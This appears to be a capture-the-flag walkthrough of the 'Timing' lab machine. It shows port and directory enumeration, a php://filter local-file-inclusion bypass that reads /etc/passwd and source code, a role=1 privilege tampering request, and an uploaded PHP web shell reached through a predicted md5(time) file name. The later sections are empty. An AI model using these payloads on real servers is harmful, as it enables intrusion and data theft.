# Timing

# Enumeration

````
map -sCV -p22,80 --min-rate 5000 10.10.11.135 -oA nmap-10.10.11.135-sCV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-05 07:51 EDT
Nmap scan report for 10.10.11.135
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Simple WebApp
|_Requested resource was ./login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.56 seconds
````

````
gobuster dir -x php,txt,html,bak,zip -e -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://timing.htb/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://timing.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,bak,zip,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/04/05 08:18:58 Starting gobuster in directory enumeration mode
===============================================================
http://timing.htb/images               (Status: 301) [Size: 309] [--> http://timing.htb/images/]
http://timing.htb/index.php            (Status: 302) [Size: 0] [--> ./login.php]                
http://timing.htb/image.php            (Status: 200) [Size: 0]                                  
http://timing.htb/login.php            (Status: 200) [Size: 5609]                               
http://timing.htb/header.php           (Status: 302) [Size: 0] [--> ./login.php]                
http://timing.htb/profile.php          (Status: 302) [Size: 0] [--> ./login.php]                
http://timing.htb/upload.php           (Status: 302) [Size: 0] [--> ./login.php]                
http://timing.htb/footer.php           (Status: 200) [Size: 3937]                               
http://timing.htb/css                  (Status: 301) [Size: 306] [--> http://timing.htb/css/]   
http://timing.htb/js                   (Status: 301) [Size: 305] [--> http://timing.htb/js/]    
http://timing.htb/logout.php           (Status: 302) [Size: 0] [--> ./login.php]                
http://timing.htb/server-status        (Status: 403) [Size: 275]                                
                                                                                                
===============================================================
2022/04/05 08:53:17 Finished

````

````
wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt --hc 404 'http://timing.htb/images/FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://timing.htb/images/FUZZ
Total requests: 43003

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000001:   403        9 L      28 W       275 Ch      ".php"                                                                                      
000000007:   403        9 L      28 W       275 Ch      ".html"                                                                                     
000000038:   403        9 L      28 W       275 Ch      ".htm"                                                                                      
000000113:   301        9 L      28 W       317 Ch      "uploads"                                                                                   
000000400:   403        9 L      28 W       275 Ch      "."                                                                                         
000000589:   403        9 L      28 W       275 Ch      ".htaccess"                                                                                 
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 12.33214
Processed Requests: 768
Filtered Requests: 762
Requests/sec.: 62.27628
````

````
wfuzz -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 'http://timing.htb/image.php?file=FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://timing.htb/image.php?file=FUZZ
Total requests: 257

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000001:   200        0 L      0 W        0 Ch        "/etc/passwd"                                                                               
000000020:   200        0 L      0 W        0 Ch        "/etc/ftpchroot"                                                                            
000000016:   200        0 L      0 W        0 Ch        "/etc/cups/cupsd.conf"                                                                      
000000003:   200        0 L      0 W        0 Ch        "/etc/aliases"                                                                              
000000007:   200        0 L      0 W        0 Ch        "/etc/at.allow"                                                                             
000000015:   200        0 L      0 W        0 Ch        "/etc/crontab"                                                                              
000000019:   200        0 L      0 W        0 Ch        "/etc/ftpaccess"                                                                            
000000018:   200        0 L      0 W        0 Ch        "/etc/fstab"             
````
There is only 0 characters returned, it is not file parameter

````
wfuzz -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 'http://timing.htb/image.php?img=FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://timing.htb/image.php?img=FUZZ
Total requests: 257

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000008:   200        0 L      3 W        25 Ch       "/etc/at.deny"                                                                              
000000010:   200        0 L      3 W        25 Ch       "/etc/bootptab"                                                                             
000000002:   200        0 L      3 W        25 Ch       "/etc/shadow"                                                                               
000000004:   200        0 L      3 W        25 Ch       "/etc/anacrontab"                                                                           
000000009:   200        0 L      3 W        25 Ch       "/etc/bashrc"                                                                               
000000006:   200        0 L      3 W        25 Ch       "/etc/apache2/httpd.conf"                                                                   
000000005:   200        0 L      3 W        25 Ch       "/etc/apache2/apache2.conf"                                                                 
000000001:   200        0 L      3 W        25 Ch       "/etc/passwd"                                                                               
000000003:   200        0 L      3 W        25 Ch       "/etc/aliases"                                                                              
000000007:   200        0 L      3 W        25 Ch       "/etc/at.allow"                                                                             
000000011:   200        0 L      3 W        25 Ch       "/etc/chrootUsers"                                                                          
000000013:   200        0 L      3 W        25 Ch       "/etc/cron.allow"
````
img parameter returned true


````http
GET /image.php?img=/etc/passwd HTTP/1.1
Host: timing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

````

````http
HTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 11:37:00 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 25
Connection: close
Content-Type: text/html; charset=UTF-8

Hacking attempt detected!
````

payload to convert result to base64 then the waf will not trigger it
````
php://filter/convert.base64-encode/resource=/etc/passwd
````

````
GET /image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: timing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


````

````
HTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 11:39:57 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2152
Connection: close
Content-Type: text/html; charset=UTF-8

cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK
````

````
$ curl http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd|base64 -d | grep bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2152  100  2152    0     0   7262      0 --:--:-- --:--:-- --:--:--  7270
root:x:0:0:root:/root:/bin/bash
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
````

Loading the upload.php file reveals admin_auth_check.php as required
````
# curl http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php|base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1360  100  1360    0     0   4021      0 --:--:-- --:--:-- --:--:--  4023
<?php
include("admin_auth_check.php");
````

````
root@kali:~/Desktop/htb/timing# curl http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php|base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   268  100   268    0     0    888      0 --:--:-- --:--:-- --:--:--   890
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
?>
````


````
POST /login.php?login=true HTTP/1.1
Host: timing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://timing.htb
Connection: close
Referer: http://timing.htb/login.php
Cookie: PHPSESSID=ci5nqe80l45hbbua3v153i6gi0
Upgrade-Insecure-Requests: 1

user=aaron&password=aaron
````

http://timing.htb/profile.php
````
POST /profile_update.php HTTP/1.1
Host: timing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://timing.htb
Connection: close
Referer: http://timing.htb/profile.php
Cookie: PHPSESSID=ci5nqe80l45hbbua3v153i6gi0

firstName=test&lastName=test&email=test&company=test
````

role = 0
````
HTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 11:49:36 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 419
Connection: close
Content-Type: text/html; charset=UTF-8

{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "0",
    "6": "0",
    "company": "test",
    "7": "test"
}
````


````
POST /profile_update.php HTTP/1.1
Host: timing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://timing.htb
Connection: close
Referer: http://timing.htb/profile.php
Cookie: PHPSESSID=ci5nqe80l45hbbua3v153i6gi0

firstName=test&lastName=test&email=test&company=test&role=1
````

````
HTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 11:51:59 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 419
Connection: close
Content-Type: text/html; charset=UTF-8

{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "1",
    "6": "1",
    "company": "test",
    "7": "test"
}
````

````
nmap -p80 --script http-date timing.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-06 12:25 GMT
Nmap scan report for timing.htb (10.10.11.135)
Host is up (0.15s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-date: Wed, 06 Apr 2022 12:25:48 GMT; 0s from local time.

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
````

set GMT timezone
````
$ timedatectl set-timezone GMT
````

````
php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' .time());echo "\n";sleep(1);}
Wed Apr 6 12:37:28 UTC 2022 = 2d944781afb4d24dc4ea88978b25f840
Wed Apr 6 12:37:29 UTC 2022 = 31ff286e59c61cb2e71c51078a01f029
Wed Apr 6 12:37:30 UTC 2022 = aaef8ef741c9541709c3eb6bece96460
Wed Apr 6 12:37:31 UTC 2022 = 166146e84714055e2683e9f9f0c6f2ea
Wed Apr 6 12:37:32 UTC 2022 = c5620b807fdeba2df0bf1b91e430ba8a
Wed Apr 6 12:37:33 UTC 2022 = 9458eb2b9ba5d6044fdedb64671c5aad
Wed Apr 6 12:37:34 UTC 2022 = d39faf2d3b032af1d76a307682527753
Wed Apr 6 12:37:35 UTC 2022 = 7a7ff4d9e2dadde281e80d8b6285099b
Wed Apr 6 12:37:36 UTC 2022 = 7ad0c3ca2cdd7c7eeda26ea51a482bf0
Wed Apr 6 12:37:37 UTC 2022 = 54f3e64d22d755f9eb2e5999130a6e60
Wed Apr 6 12:37:38 UTC 2022 = 0c369a25d4a7c2e279d0009cc9eb116e
Wed Apr 6 12:37:39 UTC 2022 = b2179426983f2228f7e94065b789f9b9
Wed Apr 6 12:37:40 UTC 2022 = 80a2815b52fa29ae0b1c3bafa233b611
Wed Apr 6 12:37:41 UTC 2022 = 45ea0a047ef21fca3dd151e2b9c605aa
Wed Apr 6 12:37:42 UTC 2022 = 9d902d40a1f97f58781e14839c793aba
Wed Apr 6 12:37:43 UTC 2022 = 876f19973e101e6eb10e8e79ab192133
Wed Apr 6 12:37:44 UTC 2022 = edb45c41a435012612821ca43f4043d7
Wed Apr 6 12:37:45 UTC 2022 = 3d5064f6780a436786e9579350548cb1
Wed Apr 6 12:37:46 UTC 2022 = 9c3db9e570eee721d32807ec21b3fb94
Wed Apr 6 12:37:47 UTC 2022 = c1fc081534dad5ff3363afe255275333
````

````
POST /upload.php HTTP/1.1
Host: timing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------365607001129933615424054169217
Content-Length: 256
Origin: http://timing.htb
Connection: close
Referer: http://timing.htb/avatar_uploader.php
Cookie: PHPSESSID=ci5nqe80l45hbbua3v153i6gi0

-----------------------------365607001129933615424054169217
Content-Disposition: form-data; name="fileToUpload"; filename="blah.jpg"
Content-Type: image/jpeg

<?php system($_GET[cmd]);?>

-----------------------------365607001129933615424054169217--
````

````
HTTP/1.1 200 OK
Date: Wed, 06 Apr 2022 12:37:39 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 27
Connection: close
Content-Type: text/html; charset=UTF-8

The file has been uploaded.
````

Wed Apr 6 12:37:39 UTC 2022 = b2179426983f2228f7e94065b789f9b9
````
$ curl "http://timing.htb/image.php?img=images/uploads/b2179426983f2228f7e94065b789f9b9_blah.jpg&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ curl "http://timing.htb/image.php?img=images/uploads/b2179426983f2228f7e94065b789f9b9_blah.jpg&cmd=ls+-ls+/opt"
total 616
616 -rw-r--r-- 1 root root 627851 Jul 20  2021 source-files-backup.zip

$ curl "http://timing.htb/image.php?img=images/uploads/source-files-backup.zip" -o source-files-backup.zip
````



# User

# Root

# Secrets

* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
* https://man.sr.ht/~rek2/Hispagatos-wiki/writeups/Timing.md
